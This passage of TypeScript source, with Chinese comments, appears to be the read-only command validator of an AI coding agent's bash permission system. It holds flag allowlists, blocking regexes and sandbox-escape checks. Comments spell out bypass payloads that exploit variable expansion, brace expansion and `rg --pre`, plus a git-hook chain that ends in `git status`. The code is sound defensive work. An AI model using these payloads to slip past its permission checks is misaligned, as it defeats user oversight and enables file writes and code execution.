      '-l': 'none',
      '--listening': 'none',
      '-o': 'none',
      '--options': 'none',
      '-e': 'none',
      '--extended': 'none',
      '-m': 'none',
      '--memory': 'none',
      '-p': 'none',
      '--processes': 'none',
      '-i': 'none',
      '--info': 'none',
      '-s': 'none',
      '--summary': 'none',
      '-4': 'none',
      '--ipv4': 'none',
      '-6': 'none',
      '--ipv6': 'none',
      '-0': 'none',
      '--packet': 'none',
      '-t': 'none',
      '--tcp': 'none',
      '-M': 'none',
      '--mptcp': 'none',
      '-S': 'none',
      '--sctp': 'none',
      '-u': 'none',
      '--udp': 'none',
      '-d': 'none',
      '--dccp': 'none',
      '-w': 'none',
      '--raw': 'none',
      '-x': 'none',
      '--unix': 'none',
      '--tipc': 'none',
      '--vsock': 'none',
      '-f': 'string',
      '--family': 'string',
      '-A': 'string',
      '--query': 'string',
      '--socket': 'string',
      '-Z': 'none',
      '--context': 'none',
      '-z': 'none',
      '--contexts': 'none',
      // 安全：-N/--net 已排除 —— 它会执行 setns()、unshare()、mount()、umount()
      // 来切换网络命名空间。虽然只作用于 fork 出的进程，但仍然过于侵入。
      '-b': 'none',
      '--bpf': 'none',
      '-E': 'none',
      '--events': 'none',
      '-H': 'none',
      '--no-header': 'none',
      '-O': 'none',
      '--oneline': 'none',
      '--tipcinfo': 'none',
      '--tos': 'none',
      '--cgroup': 'none',
      '--inet-sockopt': 'none',
      // 安全：-K/--kill 已排除 —— 会强制关闭套接字
      // 安全：-D/--diag 已排除 —— 会将原始 TCP 数据转储到文件
      // 安全：-F/--filter 已排除 —— 会从文件读取过滤器表达式
    },
  },

  // fd/fdfind —— 快速文件查找器（fd-find）。只读搜索工具。
  // 安全：-x/--exec（对每个结果执行命令）和 -X/--exec-batch
  //（对所有结果执行命令）被有意排除。
  fd: { safeFlags: { ...FD_SAFE_FLAGS } },
  // fdfind 是 fd 在 Debian/Ubuntu 上的包名 —— 同一个二进制、同样的标志
  fdfind: { safeFlags: { ...FD_SAFE_FLAGS } },

  ...PYRIGHT_READ_ONLY_COMMANDS,
  ...DOCKER_READ_ONLY_COMMANDS,
}

// gh 命令仅为 ant 环境提供，因为它们会发起网络请求，这违背了
// 只读校验中不访问网络的原则
const ANT_ONLY_COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
  // 来自共享校验映射的所有 gh 只读命令
  ...GH_READ_ONLY_COMMANDS,
  // aki —— Limkenion 内部知识库搜索 CLI。
  // 网络只读（策略与 gh 相同）。--audit-csv 已省略：它会写入磁盘。
  aki: {
    safeFlags: {
      '-h': 'none',
      '--help': 'none',
      '-k': 'none',
      '--keyword': 'none',
      '-s': 'none',
      '--semantic': 'none',
      '--no-adaptive': 'none',
      '-n': 'number',
      '--limit': 'number',
      '-o': 'number',
      '--offset': 'number',
      '--source': 'string',
      '--exclude-source': 'string',
      '-a': 'string',
      '--after': 'string',
      '-b': 'string',
      '--before': 'string',
      '--collection': 'string',
      '--drive': 'string',
      '--folder': 'string',
      '--descendants': 'none',
      '-m': 'string',
      '--meta': 'string',
      '-t': 'string',
      '--threshold': 'string',
      '--kw-weight': 'string',
      '--sem-weight': 'string',
      '-j': 'none',
      '--json': 'none',
      '-c': 'none',
      '--chunk': 'none',
      '--preview': 'none',
      '-d': 'none',
      '--full-doc': 'none',
      '-v': 'none',
      '--verbose': 'none',
      '--stats': 'none',
      '-S': 'number',
      '--summarize': 'number',
      '--explain': 'none',
      '--examine': 'string',
      '--url': 'string',
      '--multi-turn': 'number',
      '--multi-turn-model': 'string',
      '--multi-turn-context': 'string',
      '--no-rerank': 'none',
      '--audit': 'none',
      '--local': 'none',
      '--staging': 'none',
    },
  },
}

function getCommandAllowlist(): Record<string, CommandConfig> {
  let allowlist: Record<string, CommandConfig> = COMMAND_ALLOWLIST
  // 在 Windows 上，xargs 可被用作数据到代码的桥梁：如果某个文件包含
  // UNC 路径，`cat file | xargs cat` 会把该路径传给 cat，从而触发 SMB
  // 解析。由于 UNC 路径位于文件内容中（而非命令字符串中），
  // 基于正则的检测无法捕获这一点。
  if (getPlatform() === 'windows') {
    const { xargs: _, ...rest } = allowlist
    allowlist = rest
  }
  
  return allowlist
}

/**
 * 可安全用作 xargs 目标以进行自动批准的命令。
 *
 * 安全：仅当某个命令没有任何具备以下能力的标志时，才可将其加入此列表：
 * 1. 写入文件（例如 find 的 -fprint、sed 的 -i）
 * 2. 执行代码（例如 find 的 -exec、awk 的 system()、perl 的 -e）
 * 3. 发起网络请求
 *
 * 这些命令必须是纯只读工具。当 xargs 使用其中之一作为目标时，
 * 我们会停止校验目标命令之后的标志
 *（参见 isCommandSafeViaFlagParsing 中的 `break`），因此该命令本身
 * 必须不含任何危险标志，而不只是安全标志的子集。
 *
 * 每个命令都通过查阅其 man 手册中的危险能力进行了验证。
 */
const SAFE_TARGET_COMMANDS_FOR_XARGS = [
  'echo', // 仅输出，无危险标志
  'printf', // xargs 运行的是 /usr/bin/printf（二进制），而非 bash 内建 —— 不支持 -v
  'wc', // 只读计数，无危险标志
  'grep', // 只读搜索，无危险标志
  'head', // 只读，无危险标志
  'tail', // 只读（含 -f 跟随），无危险标志
]

/**
 * 统一的命令校验函数，取代了原先各自独立的校验器函数。
 * 使用 COMMAND_ALLOWLIST 中的声明式配置来校验命令及其标志。
 * 处理组合标志、参数校验以及 shell 引号绕过检测。
 */
export function isCommandSafeViaFlagParsing(command: string): boolean {
  // 使用 shell-quote 解析命令以获得准确的独立 token
  // 将 glob 操作符转换为字符串来处理，从
  // 该函数的角度看它们无关紧要
  const parseResult = tryParseShellCommand(command, env => `$${env}`)
  if (!parseResult.success) return false

  const parsed = parseResult.tokens.map(token => {
    if (typeof token !== 'string') {
      token = token as { op: 'glob'; pattern: string }
      if (token.op === 'glob') {
        return token.pattern
      }
    }
    return token
  })

  // 如果存在操作符（管道、重定向等），它就不是简单命令。
  // 将命令拆解为其组成部分由本函数的上游处理，
  // 因此这里我们拒绝任何带操作符的内容。
  const hasOperators = parsed.some(token => typeof token !== 'string')
  if (hasOperators) {
    return false
  }

  // 现在我们知道所有 token 都是字符串
  const tokens = parsed as string[]

  if (tokens.length === 0) {
    return false
  }

  // 查找匹配的命令配置
  let commandConfig: CommandConfig | undefined
  let commandTokens: number = 0

  // 优先检查多词命令（例如 "git diff"、"git stash list"）
  const allowlist = getCommandAllowlist()
  for (const [cmdPattern] of Object.entries(allowlist)) {
    const cmdTokens = cmdPattern.split(' ')
    if (tokens.length >= cmdTokens.length) {
      let matches = true
      for (let i = 0; i < cmdTokens.length; i++) {
        if (tokens[i] !== cmdTokens[i]) {
          matches = false
          break
        }
      }
      if (matches) {
        commandConfig = allowlist[cmdPattern]
        commandTokens = cmdTokens.length
        break
      }
    }
  }

  if (!commandConfig) {
    return false // 命令不在允许列表中
  }

  // 对 git ls-remote 做特殊处理，拒绝可能导致数据外泄的 URL
  if (tokens[0] === 'git' && tokens[1] === 'ls-remote') {
    // 检查是否有参数看起来像 URL 或远程规范
    for (let i = 2; i < tokens.length; i++) {
      const token = tokens[i]
      if (token && !token.startsWith('-')) {
        // 拒绝 HTTP/HTTPS URL
        if (token.includes('://')) {
          return false
        }
        // 拒绝形如 git@github.com:user/repo.git 的 SSH URL
        if (token.includes('@') || token.includes(':')) {
          return false
        }
        // 拒绝变量引用
        if (token.includes('$')) {
          return false
        }
      }
    }
  }

  // 安全：拒绝任何包含 `$`（变量展开）的 token。第 825 行的
  // `env => \`$${env}\`` 回调会把 `$VAR` 作为字面文本保留
  // 在 token 中，但 bash 会在运行时展开它（未设置的变量 → 空字符串）。
  // 这种解析器差异可同时击穿 validateFlags 和回调：
  //
  //   (1) `$VAR` 前缀击穿 validateFlags 的 `startsWith('-')` 检查：
  //       `git diff "$Z--output=/tmp/pwned"` → token `$Z--output=/tmp/pwned`
  //       （以 `$` 开头）在约 :1730 处作为位置参数落入。bash 会执行
  //       `git diff --output=/tmp/pwned`。任意文件写入，零权限。
  //
  //   (2) `$VAR` 前缀 → 通过 `rg --pre` 实现 RCE：
  //       `rg . "$Z--pre=bash" FILE` → 执行 `bash FILE`。rg 的配置
  //       没有正则也没有回调。单步任意代码执行。
  //
  //   (3) `$VAR` 中缀击穿 additionalCommandIsDangerousCallback 正则：
  //       `ps ax"$Z"e` → token `ax$Ze`。ps 回调正则
  //       `/^[a-zA-Z]*e[a-zA-Z]*$/` 在 `$` 上失败 → "不危险"。bash 会执行
  //       `ps axe` → 所有进程的环境变量。仅修复 `$` 前缀
  //       token 的方案无法封堵这一点。
  //
  // 我们检查命令前缀之后的所有 token。任何 `$` 都意味着我们无法
  // 确定运行时的 token 值，因此无法验证只读安全性。
  // 此检查必须在 validateFlags 之前、回调之前运行。
  for (let i = commandTokens; i < tokens.length; i++) {
    const token = tokens[i]
    if (!token) continue
    // 拒绝任何包含 $ 的 token（变量展开）
    if (token.includes('$')) {
      return false
    }
    // 拒绝同时包含 `{` 和 `,` 的 token（花括号展开混淆）。
    // `git diff {@'{'0},--output=/tmp/pwned}` → shell-quote 会去掉引号
    // → token `{@{0},--output=/tmp/pwned}` 含 `{` + `,` → 花括号展开。
    // 这是与 bashSecurity.ts 中 validateBraceExpansion 配合的纵深防御。
    // 我们要求同时存在 `{` 和 `,`，以避免对合法
    // 模式产生误报：`stash@{0}`（git ref，有 `{` 无 `,`）、`{{.State}}`（Go
    // 模板，无 `,`）、`prefix-{}-suffix`（xargs，无 `,`）。序列形式
    // `{1..5}` 也需要检查（含 `{` + `..`）。
    if (token.includes('{') && (token.includes(',') || token.includes('..'))) {
      return false
    }
  }

  // 校验命令 token 之后的标志
  if (
    !validateFlags(tokens, commandTokens, commandConfig, {
      commandName: tokens[0],
      rawCommand: command,
      xargsTargetCommands:
        tokens[0] === 'xargs' ? SAFE_TARGET_COMMANDS_FOR_XARGS : undefined,
    })
  ) {
    return false
  }

  if (commandConfig.regex && !commandConfig.regex.test(command)) {
    return false
  }
  if (!commandConfig.regex && /`/.test(command)) {
    return false
  }
  // 阻止 grep/rg 模式中的换行符和回车符，因为它们可能被用于注入
  if (
    !commandConfig.regex &&
    (tokens[0] === 'rg' || tokens[0] === 'grep') &&
    /[\n\r]/.test(command)
  ) {
    return false
  }
  if (
    commandConfig.additionalCommandIsDangerousCallback &&
    commandConfig.additionalCommandIsDangerousCallback(
      command,
      tokens.slice(commandTokens),
    )
  ) {
    return false
  }

  return true
}

/**
 * 创建一个正则模式，用于匹配命令的安全调用方式。
 *
 * 该正则通过阻止以下内容来确保命令被安全调用：
 * - 可能导致命令注入或重定向的 shell 元字符
 * - 通过反引号或 $() 实现的命令替换
 * - 可能包含恶意载荷的变量展开
 * - 环境变量赋值绕过（command=value）
 *
 * @param command 命令名（例如 'date'、'npm list'、'ip addr'）
 * @returns 匹配该命令安全调用方式的正则表达式
 */
function makeRegexForSafeCommand(command: string): RegExp {
  // 创建正则模式：/^command(?:\s|$)[^<>()$`|{}&;\n\r]*$/
  return new RegExp(`^${command}(?:\\s|$)[^<>()$\`|{}&;\\n\\r]*$`)
}

// 可安全执行的简单命令（使用 makeRegexForSafeCommand 转换为正则模式）
// 警告：如果要在此处添加新命令，请务必谨慎确认
// 它们确实安全。这包括确保：
// 1. 它们没有任何允许写入文件或执行命令的标志
// 2. 使用 makeRegexForSafeCommand() 以确保正确创建正则模式
const READONLY_COMMANDS = [
  // 来自共享校验的跨平台命令
  ...EXTERNAL_READONLY_COMMANDS,

  // Unix/bash 专属的只读命令（未共享，因为 PowerShell 中不存在）

  // 时间和日期
  'cal',
  'uptime',

  // 文件内容查看（相对路径单独处理）
  'cat',
  'head',
  'tail',
  'wc',
  'stat',
  'strings',
  'hexdump',
  'od',
  'nl',

  // 系统信息
  'id',
  'uname',
  'free',
  'df',
  'du',
  'locale',
  'groups',
  'nproc',

  // 路径信息
  'basename',
  'dirname',
  'realpath',

  // 文本处理
  'cut',
  'paste',
  'tr',
  'column',
  'tac', // 反向 cat —— 按行逆序显示文件内容
  'rev', // 反转每行中的字符
  'fold', // 将行折行到指定宽度
  'expand', // 将制表符转换为空格
  'unexpand', // 将空格转换为制表符
  'fmt', // 简单的文本格式化工具 —— 仅输出到 stdout
  'comm', // 逐行比较已排序的文件
  'cmp', // 逐字节比较文件
  'numfmt', // 数字格式转换

  // 路径信息（补充）
  'readlink', // 解析符号链接 —— 显示符号链接的目标

  // 文件比较
  'diff',

  // true 和 false，用于静默或制造错误
  'true',
  'false',

  // 其他安全命令
  'sleep',
  'which',
  'type',
  'expr', // 求值表达式（算术、字符串匹配）
  'test', // 条件求值（文件检查、比较）
  'getconf', // 获取系统配置值
  'seq', // 生成数字序列
  'tsort', // 拓扑排序
  'pr', // 对文件分页以便打印
]

// 需要自定义正则模式的复杂命令
// 警告：如有可能，请避免在此处新增正则，优先使用 COMMAND_ALLOWLIST
// 取而代之。这种基于允许列表的 CLI 标志处理方式更安全，可避免
// 来自 gnu getopt_long 的漏洞。
const READONLY_COMMAND_REGEXES = new Set([
  // 使用 makeRegexForSafeCommand 将简单命令转换为正则模式
  ...READONLY_COMMANDS.map(makeRegexForSafeCommand),

  // 不执行命令、不使用变量的 echo
  // 允许单引号内的换行（安全），但不允许双引号内的换行（配合变量展开可能危险）
  // 同时允许末尾可选的 2>&1 stderr 重定向
  /^echo(?:\s+(?:'[^']*'|"[^"$<>\n\r]*"|[^|;&`$(){}><#\\!"'\s]+))*(?:\s+2>&1)?\s*$/,

  // Limkenion CLI 帮助
  /^limkenion -h$/,
  /^limkenion --help$/,

  // git 只读命令现在通过 COMMAND_ALLOWLIST 配合显式标志校验来处理
  //（git status、git blame、git ls-files、git config --get、git remote、git tag、git branch）

  /^uniq(?:\s+(?:-[a-zA-Z]+|--[a-zA-Z-]+(?:=\S+)?|-[fsw]\s+\d+))*(?:\s|$)\s*$/, // 仅允许标志，不允许输入/输出文件

  // 系统信息
  /^pwd$/,
  /^whoami$/,
  // 已移除 env 和 printenv —— 它们可能泄露敏感环境变量

  // 开发工具版本检查 —— 仅精确匹配，不允许后缀。
  // 安全：`node -v --run <task>` 会执行 package.json 中的脚本，因为
  // Node 会先处理 --run 再处理 -v。Python/python3 --version 也做了锚定
  // 以作纵深防御。这些此前位于 EXTERNAL_READONLY_COMMANDS 中，
  // 该列表会经由 makeRegexForSafeCommand 处理并允许任意后缀。
  /^node -v$/,
  /^node --version$/,
  /^python --version$/,
  /^python3 --version$/,

  // 其他安全命令
  // tree 命令已移至 COMMAND_ALLOWLIST 以进行正确的标志校验（阻止 -o/--output）
  /^history(?:\s+\d+)?\s*$/, // 仅允许裸 history 或带数字参数的 history —— 防止写入文件
  /^alias$/,
  /^arch(?:\s+(?:--help|-h))?\s*$/, // 仅允许带帮助标志或不带参数的 arch

  // 网络命令 —— 仅允许不带参数的确切命令，以防止网络操纵
  /^ip addr$/, // 仅允许不带额外参数的 "ip addr"
  /^ifconfig(?:\s+[a-zA-Z][a-zA-Z0-9_-]*)?\s*$/, // 仅允许 ifconfig 带接口名（必须以字母开头）

  // 使用 jq 处理 JSON —— 允许内联过滤器和文件参数
  // 文件参数由 pathValidation.ts 单独校验
  // 允许引号内的管道和复杂表达式，但阻止危险标志
  // 阻止命令替换 —— 对 jq 而言，即使在单引号内反引号也是危险的
  // 阻止 -f/--from-file、--rawfile、--slurpfile（将文件读入 jq）、--run-tests、-L/--library-path（加载可执行模块）
  // 阻止 'env' 内建和 '$ENV' 对象，它们可访问环境变量（纵深防御）
  /^jq(?!\s+.*(?:-f\b|--from-file|--rawfile|--slurpfile|--run-tests|-L\b|--library-path|\benv\b|\$ENV\b))(?:\s+(?:-[a-zA-Z]+|--[a-zA-Z-]+(?:=\S+)?))*(?:\s+'[^'`]*'|\s+"[^"`]*"|\s+[^-\s'"][^\s]*)+\s*$/,

  // 路径命令（路径校验会确保它们被允许）
  // cd 命令 —— 允许切换到目录
  /^cd(?:\s+(?:'[^']*'|"[^"]*"|[^\s;|&`$(){}><#\\]+))?$/,
  // ls 命令 —— 允许列出目录
  /^ls(?:\s+[^<>()$`|{}&;\n\r]*)?$/,
  // find 命令 —— 阻止危险标志
  // 允许转义的括号 \( 和 \) 用于分组，但阻止未转义的括号
  // 注意：\\[()] 必须位于字符类之前，以确保 \( 被匹配为转义括号，
  // 而不是反斜杠 + 括号（后者会失败，因为括号被排除在字符类之外）
  /^find(?:\s+(?:\\[()]|(?!-delete\b|-exec\b|-execdir\b|-ok\b|-okdir\b|-fprint0?\b|-fls\b|-fprintf\b)[^<>()$`|{}&;\n\r\s]|\s)+)?$/,
])

/**
 * 检查命令是否在 bash 会将其视为字面量的引号上下文之外，包含 glob 字符（?、*、[、]）
 * 或可展开的 `$` 变量。
 * 这些内容展开后可能绕过我们基于正则的安全检查。
 *
 * Glob 示例：
 * - 如果存在名为 `--help` 的文件，`python *` 可能展开为 `python --help`
 * - 如果存在这样的文件，`find ./ -?xec` 可能展开为 `find ./ -exec`
 * 在单引号和双引号内，glob 都是字面量。
 *
 * 变量展开示例：
 * - `uniq --skip-chars=0$_` → `$_` 展开为上一条命令的最后一个参数；
 *   配合 IFS 分词，可将位置参数偷渡过 "仅允许标志" 的
 *   正则。`echo " /etc/passwd /tmp/x"; uniq --skip-chars=0$_` → 文件写入。
 * - `cd "$HOME"` → 双引号内的 `$HOME` 会在运行时展开。
 * 变量仅在单引号内是字面量；在双引号内
 * 和未加引号时都会展开。
 *
 * `$` 检查守护的是 READONLY_COMMAND_REGEXES 降级路径。
 * isCommandSafeViaFlagParsing 中的 `$` token 检查只覆盖 COMMAND_ALLOWLIST
 * 命令；像 uniq 的 `\S+` 和 cd 的 `"[^"]*"` 这样的手写正则允许 `$`。
 * 匹配 `$` 后跟 `[A-Za-z_@*#?!$0-9-]`，覆盖 `$VAR`、`$_`、`$@`、
 * `$*`、`$#`、`$?`、`$!`、`$$`、`$-`、`$0`-`$9`。不匹配 `${` 或 `$(` ——
 * 这些由 bashSecurity.ts 中的 COMMAND_SUBSTITUTION_PATTERNS 捕获。
 *
 * @param command 要检查的命令字符串
 * @returns 如果命令包含未加引号的 glob 或可展开的 `$` 则返回 true
 */
function containsUnquotedExpansion(command: string): boolean {
  // 跟踪引号状态，避免引号内模式产生误报
  let inSingleQuote = false
  let inDoubleQuote = false
  let escaped = false

  for (let i = 0; i < command.length; i++) {
    const currentChar = command[i]

    // 处理转义序列
    if (escaped) {
      escaped = false
      continue
    }

    // 安全：仅在单引号之外把反斜杠视为转义。在 bash 中，
    // `'...'` 内的 `\` 是字面量 —— 它不会转义下一个字符。
    // 若没有这道防护，`'\'` 会使引号跟踪器失步：`\` 会设置
    // escaped=true，随后闭合的 `'` 被转义跳过逻辑消费，
    // 而不是切换 inSingleQuote。解析器会在命令的剩余部分
    // 一直停留在单引号模式，漏掉之后所有的展开。
    // 示例：`ls '\' *` —— bash 看到 glob `*`，但失步的解析器认为
    // `*` 位于引号内 → 返回 false（未检测到 glob）。
    // 纵深防御：hasShellQuoteSingleQuoteBug 会在到达此函数之前
    // 捕获 `'\'` 模式，但我们仍修复该跟踪器，以与
    // bashSecurity.ts 中的正确实现保持一致。
    if (currentChar === '\\' && !inSingleQuote) {
      escaped = true
      continue
    }

    // 更新引号状态
    if (currentChar === "'" && !inDoubleQuote) {
      inSingleQuote = !inSingleQuote
      continue
    }

    if (currentChar === '"' && !inSingleQuote) {
      inDoubleQuote = !inDoubleQuote
      continue
    }

    // 单引号内：一切都是字面量。跳过。
    if (inSingleQuote) {
      continue
    }

    // 检查 `$` 后跟变量名或特殊参数字符。
    // `$` 在双引号内和未加引号时都会展开（只有单引号才使其成为字面量）。
    if (currentChar === '$') {
      const next = command[i + 1]
      if (next && /[A-Za-z_@*#?!$0-9-]/.test(next)) {
        return true
      }
    }

    // glob 在双引号内也是字面量。仅检查未加引号的情况。
    if (inDoubleQuote) {
      continue
    }

    // 检查所有引号之外的 glob 字符。
    // 这些内容可能展开为任何东西，包括危险标志。
    if (currentChar && /[?*[\]]/.test(currentChar)) {
      return true
    }
  }

  return false
}

/**
 * 根据 READONLY_COMMAND_REGEXES 检查单个命令字符串是否为只读。
 * 用于校验单条命令的内部辅助函数。
 *
 * @param command 要检查的命令字符串
 * @returns 如果命令是只读的则返回 true
 */
function isCommandReadOnly(command: string): boolean {
  // 处理常见的 stderr 到 stdout 重定向模式
  // 这同时处理完整命令末尾的 "command 2>&1"
  // 以及作为管道组成部分的 "command 2>&1"
  let testCommand = command.trim()
  if (testCommand.endsWith(' 2>&1')) {
    // 为模式匹配移除 stderr 重定向
    testCommand = testCommand.slice(0, -5).trim()
  }

  // 检查可能易受 WebDAV 攻击的 Windows UNC 路径
  // 尽早执行此检查，以防任何带 UNC 路径的命令被标记为只读
  if (containsVulnerableUncPath(testCommand)) {
    return false
  }

  // 检查未加引号的 glob 字符和可展开的 `$` 变量，它们可能
  // 绕过我们基于正则的安全检查。我们无法知道这些内容
  // 在运行时会展开成什么，因此无法验证命令是只读的。
  //
  // Glob：如果存在这样的文件，`python *` 可能展开为 `python --help`。
  //
  // 变量：`uniq --skip-chars=0$_` —— bash 在运行时会展开 `$_` 为
  // 上一条命令的最后一个参数。配合 IFS 分词，可将位置参数
  // 偷渡过 uniq 的 `\S+` 这类 "仅允许标志" 的正则。isCommandSafeViaFlagParsing
  // 内部的 `$` token 检查只覆盖 COMMAND_ALLOWLIST 命令；
  // READONLY_COMMAND_REGEXES 中的手写正则（uniq、jq、cd）
  // 没有此类防护。完整分析见 containsUnquotedExpansion。
  if (containsUnquotedExpansion(testCommand)) {
    return false
  }

  // 像 git 这样的工具允许把 `--upload-pack=cmd` 缩写为 `--up=cmd`
  // 正则过滤可能被绕过，因此我们改用严格的允许列表校验。
  // 这需要定义一组已知的安全标志。Limkenion 可以协助完成，
  // 但请人工复核，确保它没有加入任何允许写入文件、
  // 执行代码或发起网络请求的标志。
  if (isCommandSafeViaFlagParsing(testCommand)) {
    return true
  }

  for (const regex of READONLY_COMMAND_REGEXES) {
    if (regex.test(testCommand)) {
      // 阻止带 -c 标志的 git 命令，以避免可能导致代码执行的配置项
      // -c 标志允许内联设置任意 git 配置值，包括 core.fsmonitor、
      // diff.external、core.gitProxy 等可执行任意命令的危险配置
      // 检查 -c 前面是空白、后面是空白或等号的情况
      // 使用正则捕获空格、制表符和其他空白（而不是 --cached 等标志的一部分）
      if (testCommand.includes('git') && /\s-c[\s=]/.test(testCommand)) {
        return false
      }

      // 阻止带 --exec-path 标志的 git 命令，以避免可能导致代码执行的路径操纵
      // --exec-path 标志允许覆盖 git 查找可执行文件的目录
      if (
        testCommand.includes('git') &&
        /\s--exec-path[\s=]/.test(testCommand)
      ) {
        return false
      }

      // 阻止带 --config-env 标志的 git 命令，以避免通过环境变量注入配置
      // --config-env 标志允许从环境变量设置 git 配置值，其危险程度
      // 与 -c 标志相当（例如 core.fsmonitor、diff.external、core.gitProxy）
      if (
        testCommand.includes('git') &&
        /\s--config-env[\s=]/.test(testCommand)
      ) {
        return false
      }
      return true
    }
  }
  return false
}

/**
 * 检查复合命令中是否包含任何 git 命令。
 *
 * @param command 要检查的完整命令字符串
 * @returns 如果任何子命令是 git 命令则返回 true
 */
function commandHasAnyGit(command: string): boolean {
  return splitCommand_DEPRECATED(command).some(subcmd =>
    isNormalizedGitCommand(subcmd.trim()),
  )
}

/**
 * 可被用于沙箱逃逸的 git 内部路径模式。
 * 如果某条命令创建了这些文件，随后又运行 git，那么该 git 命令
 * 可能从所创建的文件中执行恶意钩子。
 */
const GIT_INTERNAL_PATTERNS = [
  /^HEAD$/,
  /^objects(?:\/|$)/,
  /^refs(?:\/|$)/,
  /^hooks(?:\/|$)/,
]

/**
 * 检查某个路径是否为 git 内部路径（HEAD、objects/、refs/、hooks/）。
 */
function isGitInternalPath(path: string): boolean {
  // 通过移除开头的 ./ 或 / 来规范化路径
  const normalized = path.replace(/^\.?\//, '')
  return GIT_INTERNAL_PATTERNS.some(pattern => pattern.test(normalized))
}

// 仅删除或就地修改的命令（不会在新路径创建新文件）
const NON_CREATING_WRITE_COMMANDS = new Set(['rm', 'rmdir', 'sed'])

/**
 * 使用 PATH_EXTRACTORS 从子命令中提取写入路径。
 * 仅返回那些能创建新文件/目录的命令的路径
 *（写/创建操作，不包括删除和就地修改）。
 */
function extractWritePathsFromSubcommand(subcommand: string): string[] {
  const parseResult = tryParseShellCommand(subcommand, env => `$${env}`)
  if (!parseResult.success) return []

  const tokens = parseResult.tokens.filter(
    (t): t is string => typeof t === 'string',
  )
  if (tokens.length === 0) return []

  const baseCmd = tokens[0]
  if (!baseCmd) return []

  // 仅考虑能在目标路径创建文件的命令
  if (!(baseCmd in COMMAND_OPERATION_TYPE)) {
    return []
  }
  const opType = COMMAND_OPERATION_TYPE[baseCmd as PathCommand]
  if (
    (opType !== 'write' && opType !== 'create') ||
    NON_CREATING_WRITE_COMMANDS.has(baseCmd)
  ) {
    return []
  }

  const extractor = PATH_EXTRACTORS[baseCmd as PathCommand]
  if (!extractor) return []

  return extractor(tokens.slice(1))
}

/**
 * 检查复合命令是否写入任何 git 内部路径。
 * 这用于检测潜在的沙箱逃逸攻击：某条命令先创建 git 内部文件
 *（HEAD、objects/、refs/、hooks/），随后再运行 git。
 *
 * 安全：复合命令可以通过以下方式绕过裸仓库检测：
 * 1. 在同一条命令中创建裸 git 仓库文件（HEAD、objects/、refs/、hooks/）
 * 2. 然后运行 git，从而执行恶意钩子
 *
 * 攻击示例：
 * mkdir -p objects refs hooks && echo '#!/bin/bash\nmalicious' > hooks/pre-commit && touch HEAD && git status
 *
 * @param command 要检查的完整命令字符串
 * @returns 如果任何子命令写入 git 内部路径则返回 true
 */
function commandWritesToGitInternalPaths(command: string): boolean {
  const subcommands = splitCommand_DEPRECATED(command)

  for (const subcmd of subcommands) {
    const trimmed = subcmd.trim()

    // 检查基于路径的命令的写入路径（mkdir、touch、cp、mv）
    const writePaths = extractWritePathsFromSubcommand(trimmed)
    for (const path of writePaths) {
      if (isGitInternalPath(path)) {
        return true
      }
    }

    // 检查输出重定向（例如 echo x > hooks/pre-commit）
    const { redirections } = extractOutputRedirections(trimmed)
    for (const { target } of redirections) {
      if (isGitInternalPath(target)) {
        return true
      }
    }
  }

  return false
}

/**
 * 检查 bash 命令的只读约束。
 * 这是唯一导出的、用于校验命令是否为只读的函数。
 * 它处理复合命令、沙箱模式以及安全检查。
 *
 * @param input 要校验的 bash 命令输入
 * @param compoundCommandHasCd 预计算的标志，表示复合命令中是否存在任何 cd 命令。
 *                              由 commandHasAnyCd() 计算并传入，以避免重复计算。
 * @returns PermissionResult，表示命令是否为只读
 */
export function checkReadOnlyConstraints(
  input: z.infer<typeof BashTool.inputSchema>,
  compoundCommandHasCd: boolean,
): PermissionResult {
  const { command } = input

  // 检测命令是否不可解析，并提前返回
  const result = tryParseShellCommand(command, env => `$${env}`)
  if (!result.success) {
    return {
      behavior: 'passthrough',
      message: 'Command cannot be parsed, requires further permission checks',
    }
  }

  // 在拆分之前检查原始命令的安全性
  // 这很重要，因为 splitCommand_DEPRECATED 可能会转换命令
  //（例如 ${VAR} 变成 $VAR）
  if (bashCommandIsSafe_DEPRECATED(command).behavior !== 'passthrough') {
    return {
      behavior: 'passthrough',
      message: 'Command is not read-only, requires further permission checks',
    }
  }

  // 在转换之前检查原始命令中的 Windows UNC 路径
  // 这必须在 splitCommand_DEPRECATED 之前完成，因为它可能会转换反斜杠
  if (containsVulnerableUncPath(command)) {
    return {
      behavior: 'ask',
      message:
        'Command contains Windows UNC path that could be vulnerable to WebDAV attacks',
    }
  }

  // 一次性检查是否有子命令是 git 命令（用于下文的多项安全检查）
  const hasGitCommand = commandHasAnyGit(command)

  // 安全：阻止同时包含 cd 和 git 的复合命令
  // 这可防止通过 cd /malicious/dir && git status 进行沙箱逃逸，
  // 其中恶意目录包含会执行任意代码的伪造 git 钩子。
  if (compoundCommandHasCd && hasGitCommand) {
    return {
      behavior: 'passthrough',
      message:
        'Compound commands with cd and git require permission checks for enhanced security',
    }
  }

  // 安全：如果当前目录看起来像裸仓库/被利用的 git 仓库，则阻止 git 命令
  // 这可在攻击者做了以下事情时防止沙箱逃逸：
  // 1. 删除 .git/HEAD 使正常的 git 目录失效
  // 2. 在当前目录中创建 hooks/pre-commit 或其他 git 内部文件
  // 此时 git 会把 cwd 当作 git 目录并执行恶意钩子。
  if (hasGitCommand && isCurrentDirectoryBareGitRepo()) {
    return {
      behavior: 'passthrough',
      message:
        'Git commands in directories with bare repository structure require permission checks for enhanced security',
    }
  }

  // 安全：阻止既写入 git 内部路径又运行 git 的复合命令
  // 这可防止沙箱逃逸：某条命令先创建 git 内部文件
  //（HEAD、objects/、refs/、hooks/），然后运行 git，从而执行
  // 新创建文件中的恶意钩子。
  // 攻击示例：mkdir -p hooks && echo 'malicious' > hooks/pre-commit && git status
  if (hasGitCommand && commandWritesToGitInternalPaths(command)) {
    return {
      behavior: 'passthrough',
      message:
        'Compound commands that create git internal files and run git require permission checks for enhanced security',
    }
  }

  // 安全：仅当我们处于原始 cwd（受沙箱 denyWrite 保护）
  // 或沙箱已禁用（攻击无意义）时，才自动允许 git 命令为只读。
  // 竞态：沙箱内的命令可以在子目录中创建裸仓库文件，
  // 而后台运行的 git 命令（例如 sleep 10 && git status）会在这些文件
  // 尚不存在时就通过 isCurrentDirectoryBareGitRepo() 检查。
  if (
    hasGitCommand &&
    SandboxManager.isSandboxingEnabled() &&
    getCwd() !== getOriginalCwd()
  ) {
    return {
      behavior: 'passthrough',
      message:
        'Git commands outside the original working directory require permission checks when sandbox is enabled',
    }
  }

  // 检查是否所有子命令都是只读的
  const allSubcommandsReadOnly = splitCommand_DEPRECATED(command).every(
    subcmd => {
